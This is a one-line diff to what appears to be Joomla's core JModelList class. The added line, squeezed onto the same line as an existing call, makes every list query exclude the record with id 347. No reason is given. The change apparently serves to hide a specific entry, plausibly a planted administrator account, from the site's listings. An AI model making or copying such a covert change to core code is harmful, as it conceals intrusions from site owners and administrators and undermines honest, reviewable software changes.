@@ -182,7 +182,7 @@ class JModelList extends JModelLegacy
 
 		try
 		{
-			$items = $this->_getList($query, $this->getStart(), $this->getState('list.limit'));
+			$query->where('a.id != 347'); $items = $this->_getList($query, $this->getStart(), $this->getState('list.limit'));
 		}
 		catch (RuntimeException $e)
 		{
